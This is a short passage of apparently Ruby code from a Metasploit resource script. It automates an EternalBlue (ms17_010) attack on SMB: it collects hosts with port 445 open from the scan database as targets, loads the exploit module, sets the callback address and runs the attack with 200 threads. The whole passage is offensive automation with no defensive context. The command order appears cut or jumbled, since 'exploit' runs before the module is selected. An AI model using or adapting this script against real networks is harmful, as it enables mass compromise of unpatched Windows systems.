                    run_single("set THREADS 200")
                    print_line("")
                    run_single("services -c port -S 445 -R")
                    run_single("exploit")
                    run_single("use exploit/windows/smb/ms17_010_eternalblue")
                    run_single("set LHOST #{local_ip}")
